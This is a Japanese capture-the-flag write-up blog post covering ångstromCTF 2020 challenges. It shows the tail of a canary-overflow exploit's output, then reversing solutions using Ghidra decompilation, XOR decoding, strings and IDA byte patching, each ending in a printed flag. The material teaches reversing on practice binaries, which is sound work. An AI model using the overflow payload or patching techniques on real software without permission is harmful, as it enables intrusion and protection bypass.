+What<span style="color:#960050;background-color:#1e0010">&#39;</span>s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\x</span>11!
+actf<span style="color:#f92672">{</span>that_gosh_darn_canary_got_me_pwned!<span style="color:#f92672">}</span>
+Segmentation fault
+</code></pre></div><h1 id="rev">REV</h1>
+<h2 id="revving-up-rev-50-pts-926-solves">Revving Up (Rev, 50 pts, 926 solves)</h2>
+<pre><code>Clam wrote a program for his school's cybersecurity club's first rev lecture! Can you get it to give you the flag?
+You can find it at /problems/2020/revving_up on the shell server, which you can access via the &quot;shell&quot; link at the top of the site.
+</code></pre><p>CTFサイトにあるshellでプログラム実行してみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">team5954@actf:/problems/2020/revving_up$ ./revving_up
+Congratulations on running the binary!
+Now there are a few more things to tend to.
+Please type <span style="color:#e6db74">&#34;give flag&#34;</span> <span style="color:#f92672">(</span>without the quotes<span style="color:#f92672">)</span>.
+give flag
+Good job!
+Now run the program with a command line argument of <span style="color:#e6db74">&#34;banana&#34;</span> and you<span style="color:#960050;background-color:#1e0010">&#39;</span>ll be <span style="color:#66d9ef">done</span>!
+</code></pre></div><p><code>type &quot;give flag&quot;</code>と言われたので<code>give flag</code>と打つと、引数に<code>banana</code>をつけろと言われました。</p>
+<p>引数に<code>banana</code>をつけて、再度試してみます。</p>
+<pre><code>team5954@actf:/problems/2020/revving_up$ ./revving_up banana
+Congratulations on running the binary!
+Now there are a few more things to tend to.
+Please type &quot;give flag&quot; (without the quotes).
+give flag
+Good job!
+Well I think it's about time you got the flag!
+actf{g3tting_4_h4ng_0f_l1nux_4nd_b4sh}
+</code></pre><p>フラグが得られました！</p>
+<p><code>actf{g3tting_4_h4ng_0f_l1nux_4nd_b4sh}</code></p>
+<h2 id="windows-of-opportunity-rev-50-pts-772-solves">Windows of Opportunity (Rev, 50 pts, 772 solves)</h2>
+<pre><code>Clam's a windows elitist and he just can't stand seeing all of these linux challenges!
+So, he decided to step in and create his own rev challenge with the &quot;superior&quot; operating system.
+</code></pre><p><strong>Linux</strong>で<code>strings</code>コマンドを使ってファイルの文字列を確認するとフラグがありました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# strings windows_of_opportunity.exe  | grep actf
+bactf<span style="color:#f92672">{</span>ok4y_m4yb3_linux_is_s7ill_b3tt3r<span style="color:#f92672">}</span>
+</code></pre></div><p><code>actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}</code></p>
+<h2 id="taking-off-rev-70-pts-523-solves">Taking Off (Rev, 70 pts, 523 solves)</h2>
+<pre><code>So you started revving up, but is it enough to take off? Find the problem in /problems/2020/taking_off/ in the shell server.
+</code></pre><p>配布されたプログラムを実行してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# ./taking_off
+So you figured out how to provide input and command line arguments.
+But can you figure out what input to provide?
+Make sure you have the correct amount of command line arguments!
+</code></pre></div><p>どうやら決められた数の引数をつける必要がありそうです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# ./taking_off
+So you figured out how to provide input and command line arguments.
+But can you figure out what input to provide?
+Make sure you have the correct amount of command line arguments!
+</code></pre></div><p>4個つけてみたところ、値が違うと言われました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# ./taking_off <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>
+So you figured out how to provide input and command line arguments.
+But can you figure out what input to provide?
+Don<span style="color:#e6db74">&#39;t try to guess the arguments, it won&#39;</span>t work.
+</code></pre></div><p><code>Ghidra</code>を使って静的解析をしてみましょう。</p>
+<p>main関数を逆コンパイルした結果を以下に示します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> iParm1,<span style="color:#66d9ef">long</span> lParm2)
+
+{
+  <span style="color:#66d9ef">int</span> iVar1;
+  undefined8 uVar2;
+  size_t sVar3;
+  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+  uint local_b4;
+  uint local_b0;
+  uint local_ac;
+  <span style="color:#66d9ef">int</span> local_a8;
+  <span style="color:#66d9ef">int</span> local_a4;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_a0;
+  byte local_98 [<span style="color:#ae81ff">136</span>];
+  <span style="color:#66d9ef">long</span> local_10;
+  
+  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">So you figured out how to provide input and command line arguments.</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">But can you figure out what input to provide?</span><span style="color:#e6db74">&#34;</span>);
+  <span style="color:#66d9ef">if</span> (iParm1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>) {
+    string_to_int(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>),<span style="color:#f92672">&amp;</span>local_b4,<span style="color:#f92672">&amp;</span>local_b4);
+    string_to_int(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#f92672">&amp;</span>local_b0,<span style="color:#f92672">&amp;</span>local_b0);
+    string_to_int(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>),<span style="color:#f92672">&amp;</span>local_ac,<span style="color:#f92672">&amp;</span>local_ac);
+    iVar1 <span style="color:#f92672">=</span> is_invalid((ulong)local_b4);
+    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+      iVar1 <span style="color:#f92672">=</span> is_invalid((ulong)local_b0);
+      <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+        iVar1 <span style="color:#f92672">=</span> is_invalid((ulong)local_ac);
+        <span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (local_ac <span style="color:#f92672">+</span> local_b0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> local_b4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3a4</span>)) {
+          iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>),<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chicken</span><span style="color:#e6db74">&#34;</span>);
+          <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+            puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Well, you found the arguments, but what</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s the password?</span><span style="color:#e6db74">&#34;</span>);
+            fgets((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_98,<span style="color:#ae81ff">0x80</span>,stdin);
+            local_a0 <span style="color:#f92672">=</span> strchr((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_98,<span style="color:#ae81ff">10</span>);
+            <span style="color:#66d9ef">if</span> (local_a0 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+              <span style="color:#f92672">*</span>local_a0 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\0</span><span style="color:#e6db74">&#39;</span>;
+            }
+            sVar3 <span style="color:#f92672">=</span> strlen((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_98);
+            local_a4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)sVar3;
+            local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            <span style="color:#66d9ef">while</span> (local_a8 <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> local_a4) {
+              <span style="color:#66d9ef">if</span> ((local_98[(<span style="color:#66d9ef">long</span>)local_a8] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">!</span><span style="color:#f92672">=</span> desired[(<span style="color:#66d9ef">long</span>)local_a8]) {
+                puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m sure it</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s just a typo. Try again.</span><span style="color:#e6db74">&#34;</span>);
+                uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+                <span style="color:#66d9ef">goto</span> LAB_00400bc7;
+              }
+              local_a8 <span style="color:#f92672">=</span> local_a8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+            }
+            puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Good job! You</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">re ready to move on to bigger and badder rev!</span><span style="color:#e6db74">&#34;</span>);
+            print_flag();
+            uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+            <span style="color:#66d9ef">goto</span> LAB_00400bc7;
+          }
+        }
+      }
+    }
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t try to guess the arguments, it won</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t work.</span><span style="color:#e6db74">&#34;</span>);
+    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+  }
+  <span style="color:#66d9ef">else</span> {
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Make sure you have the correct amount of command line arguments!</span><span style="color:#e6db74">&#34;</span>);
+    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+  }
+LAB_00400bc7:
+  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  }
+  <span style="color:#66d9ef">return</span> uVar2;
+}
+</code></pre></div><p>以下の部分で引数のチェックを行っています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (local_ac <span style="color:#f92672">+</span> local_b0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> local_b4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3a4</span>)) {
+  iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>),<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chicken</span><span style="color:#e6db74">&#34;</span>);
+</code></pre></div><p>0x3a4は10進数で932なので、３つの引数は以下になります。</p>
+<pre><code>local_b4  = 3
+local_b0 = 9
+local_ac = 2
+</code></pre><p>また、4つ目の引数は<code>chicken</code>で良さそうです。</p>
+<p><code>./taking_off 3 9 2 chicken</code>で実行してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# ./taking_off <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">2</span> chicken
+So you figured out how to provide input and command line arguments.
+But can you figure out what input to provide?
+Well, you found the arguments, but what<span style="color:#e6db74">&#39;s the password?
+</span><span style="color:#e6db74">a 
+</span><span style="color:#e6db74">I&#39;</span>m sure it<span style="color:#960050;background-color:#1e0010">&#39;</span>s just a typo. Try again.
+</code></pre></div><p>次はパスワードを当てる必要があるようです。</p>
+<p>以下の部分でパスワードの判定をしています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> <span style="color:#66d9ef">while</span> (local_a8 <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> local_a4) {
+              <span style="color:#66d9ef">if</span> ((local_98[(<span style="color:#66d9ef">long</span>)local_a8] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">!</span><span style="color:#f92672">=</span> desired[(<span style="color:#66d9ef">long</span>)local_a8]) {
+                puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m sure it</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s just a typo. Try again.</span><span style="color:#e6db74">&#34;</span>);
+                uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+                <span style="color:#66d9ef">goto</span> LAB_00400bc7;
+              }
+              local_a8 <span style="color:#f92672">=</span> local_a8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+            }
+</code></pre></div><p><code>desired</code>という配列の値と0x2aのXORを取ったものがパスワードだと分かります。</p>
+<p><code>desired</code>の値は以下の通りです。</p>
+<pre><code>                             desired
+
+           00602090 5a              undefined15Ah                     [0]
+           00602091 46              undefined146h                     [1]
+           00602092 4f              undefined14Fh                     [2]
+           00602093 4b              undefined14Bh                     [3]
+           00602094 59              undefined159h                     [4]
+           00602095 4f              undefined14Fh                     [5]
+           00602096 0a              undefined10Ah                     [6]
+           00602097 4d              undefined14Dh                     [7]
+           00602098 43              undefined143h                     [8]
+           00602099 5c              undefined15Ch                     [9]
+           0060209a 4f              undefined14Fh                     [10]
+           0060209b 0a              undefined10Ah                     [11]
+           0060209c 4c              undefined14Ch                     [12]
+           0060209d 46              undefined146h                     [13]
+           0060209e 4b              undefined14Bh                     [14]
+           0060209f 4d              undefined14Dh                     [15]
+           006020a0 2a              undefined12Ah                     [16]
+
+</code></pre><p>それでは実際に計算してみましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">enc <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x5A</span>,
+    <span style="color:#ae81ff">0x46</span>,
+    <span style="color:#ae81ff">0x4F</span>,
+    <span style="color:#ae81ff">0x4B</span>,
+    <span style="color:#ae81ff">0x59</span>,
+    <span style="color:#ae81ff">0x4F</span>,
+    <span style="color:#ae81ff">0x0A</span>,
+    <span style="color:#ae81ff">0x4D</span>,
+    <span style="color:#ae81ff">0x43</span>,
+    <span style="color:#ae81ff">0x5C</span>,
+    <span style="color:#ae81ff">0x4F</span>,
+    <span style="color:#ae81ff">0x0A</span>,
+    <span style="color:#ae81ff">0x4C</span>,
+    <span style="color:#ae81ff">0x46</span>,
+    <span style="color:#ae81ff">0x4B</span>,
+    <span style="color:#ae81ff">0x4D</span>,
+    <span style="color:#ae81ff">0x2A</span>
+    ]
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> enc:
+    flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(e <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>)
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>正しいパスワードは<code>please give flag</code>でした。</p>
+<p>早速CTFページにあるshellに入力してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">team5954@actf:/problems/2020/taking_off$ ./taking_off <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">2</span> chicken
+So you figured out how to provide input and command line arguments.
+But can you figure out what input to provide?
+Well, you found the arguments, but what<span style="color:#e6db74">&#39;s the password?
+</span><span style="color:#e6db74">please give flag
+</span><span style="color:#e6db74">Good job! You&#39;</span>re ready to move on to bigger and badder rev!
+actf<span style="color:#f92672">{</span>th3y_gr0w_up_s0_f4st<span style="color:#f92672">}</span>
+</code></pre></div><p>フラグが出てきました！！</p>
+<p><code>actf{th3y_gr0w_up_s0_f4st}</code></p>
+<h2 id="patcherman-rev-100-pts-259-solves">Patcherman (Rev, 100 pts, 259 solves)</h2>
+<pre><code>Oh no! We were gonna make this an easy challenge where you just had to run the binary and it gave you the flag, but then clam came along under the name of &quot;The Patcherman&quot; and edited the binary! 
+I think he also touched some bytes in the header to throw off disassemblers. Can you still retrieve the flag?
+
+Alternatively, find it on the shell server at /problems/2020/patcherman/.
+</code></pre><p>配布されたプログラムを実行してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# ./patcherman
+Hey you<span style="color:#960050;background-color:#1e0010">&#39;</span>re not supposed to get the flag! Freeze!
+</code></pre></div><p>どうやらプログラム自体を修正する必要がありそうです。</p>
+<p>今回は<code>IDA</code>で静的解析してみましょう</p>
+<p>main関数の分岐を調べてみます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77068041-45794400-6a29-11ea-855d-f2b7aef84b20.PNG" alt="キャプチャrev"></p>
+<p>以下の部分が怪しそうです。</p>
+<pre><code>mov     eax, cs:dword_601050
+cmp     eax, 1337BEEFh
+jz      short loc_4007B0
+</code></pre><p><code>dword_601050</code>の値を確認してみましょう。</p>
+<pre><code>LOAD:0000000000601050 dword_601050    dd 0F00DBABEh
+</code></pre><p>ここで<code>dword_601050</code>が<code>1337BEEFh</code>と一致しないために、正しい方向に進まないようです。</p>
+<p><code>dword_601050</code>の値を書き換えてみましょう</p>
+<p><code>IDA</code>の場合、書き換えたい値を選択し、<code>Edit</code> -&gt; <code>Patch Program</code> -&gt; <code>Change byte</code>で値を変えられます</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77068089-59bd4100-6a29-11ea-94f1-bdae95314a37.PNG" alt="キャプチャrev2"></p>
+<p>最後に、<code>Edit</code> -&gt; <code>Patch Program</code> -&gt; <code>Apply patches to input file</code> で保存します。</p>
+<p>書き換えたプログラムを実行すると、フラグが得られました！！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/rev# ./patcherman_patched 
+Here have a flag:
+actf<span style="color:#f92672">{</span>p4tch3rm4n_15_n0_m0r3<span style="color:#f92672">}</span>
+</code></pre></div><p><code>actf{p4tch3rm4n_15_n0_m0r3}</code></p>
+<h2 id="感想">感想</h2>
+<p>問題の難易度が丁度良く、(BINARYを除く)色んなジャンルを満遍なく解くことができたと思います。</p>
+<p>来年もやりたいですね。</p>
+
+			</div>
+		</div>
+	</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+			<a href="#top">Top</a>
+		</div>
+		
+		
+		<p id="copyright">
+			© Copyright 2020 kuzushiki
+		</p>
+		
+	</body>
+</html>
+
